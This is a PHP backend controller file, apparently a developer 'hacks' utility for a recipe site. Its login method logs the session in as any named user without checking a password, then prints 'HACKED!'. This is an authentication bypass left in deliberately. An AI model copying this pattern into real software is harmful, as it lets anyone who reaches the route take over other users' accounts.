<?php

/**
 *	Hacks
 *
 *	@package BluApplication
 *	@subpackage BackendControllers
 */
class Recipe4livingHacksController extends HacksController
{
	/**
	 *	Login
	 *
	 *	@access public
	 */
	public function login()
	{
		// Get username
		if (empty($this->_args[0])) {
			return false;
		}
		$username = $this->_args[0];
		
		// Get user
		$userModel = BluApplication::getModel('user');
		if (!$userId = $userModel->getUserId($username)) {
			return false;
		}
		
		// Login
		Session::set('UserID', $userId);
		
		// l33T Haxx0r w1n.
		echo 'HACKED! Logged in as <code>'.$username.'</code>';
	}
}

?>
